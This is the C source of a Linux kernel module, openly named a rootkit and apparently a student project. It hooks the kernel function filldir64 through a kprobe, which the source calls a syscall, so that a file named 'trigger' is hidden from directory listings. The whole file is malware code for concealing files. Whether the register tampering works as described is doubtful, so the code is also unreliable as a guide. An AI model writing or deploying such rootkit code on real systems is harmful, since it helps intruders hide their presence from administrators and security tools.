#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>
#include <linux/kprobes.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Victor, Nathan, Romanos");
MODULE_DESCRIPTION("Hook filldir syscall to hide a file with kprobes");
MODULE_VERSION("0.01");

static struct kprobe kp;

static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    char *filename = (char *)regs->si;
    int ret;
    printk(KERN_INFO "rootkit: filldir64 called with filename: %s\n", filename);

    if ((ret = strcmp(filename, "trigger")) == 0) {
        regs->dx = 0;
    }
    return 0;
}

static int __init rootkit_init(void)
{
    int ret;
    kp.symbol_name = "filldir64"; // Hook vers cette syscall
    kp.pre_handler = handler_pre;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        printk(KERN_ERR "rootkit: Failed to register kprobe, returned %d\n", ret);
        return ret;
    }

    return 0;
}

static void __exit rootkit_exit(void)
{
    unregister_kprobe(&kp);
    printk(KERN_INFO "rootkit: Kprobe unregistered\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);